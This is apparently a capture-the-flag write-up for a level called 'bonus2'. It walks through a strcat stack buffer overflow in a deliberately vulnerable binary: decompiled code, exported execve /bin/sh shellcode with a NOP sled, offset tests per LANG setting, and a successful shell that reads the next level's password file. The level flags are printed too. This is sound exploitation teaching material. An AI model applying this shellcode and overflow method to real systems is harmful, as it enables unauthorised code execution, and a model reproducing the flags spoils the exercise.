# Bonus 2
*password : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245*

```
$ scp -P 4242 bonus2@192.168.56.108:bonus2 binary/
```

## Analyze

in greetuser() :
```
  if (language == 1) {
    local_4c = 0xc3767948;
    ...
  }
  else {
    if (language == 2) {
      local_4c = 0x64656f47;
      ...
    }
    else {
      if (language == 0) {
        local_4c = 0x6c6c6548;
        ...
      }
    }
  }
strcat(&local_4c,&stack0x00000004);
puts(&local_4c);
...
```

```
$ ./bonus2 test ok
Hello test
```

conclusion :
- language = 0
- local_4c = "Hello "
- &stack0x00000004 = av[1]

## Buffer overflow : strcat exploit
objective : execute `/bin/sh`

- find the correct length of the first parameter to overwrite all '/0' until the second parameter => `40`
- use the correct language : environment LANG (en, fi or nl)
- use the second parameter to launch the shellcode
```
$ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

## Test language = 0
- find the offset => `26`
```
$ /tmp/a.out
0xbffff83f
$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 26 + "\x3f\xf8\xff\xbf"')
Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB?���
Segmentation fault (core dumped)
```
failed !

## Test language = 1
- find the offset => `14`

```
$ export LANG=fi
$ /tmp/a.out
0xbffff848
$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 14 + "\x48\xf8\xff\xbf"')
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBH���
Segmentation fault (core dumped)
```
failed !

## Test language = 2
- find the offset => `23`
```
$ export LANG=nl
$ /tmp/a.out
0xbffff848
$ ./bonus2 $(python -c 'print "\x42" * 40') $(python -c 'print "\x42" * 23 + "\x48\xf8\xff\xbf"')
Goedemiddag! BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBH���
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
success !
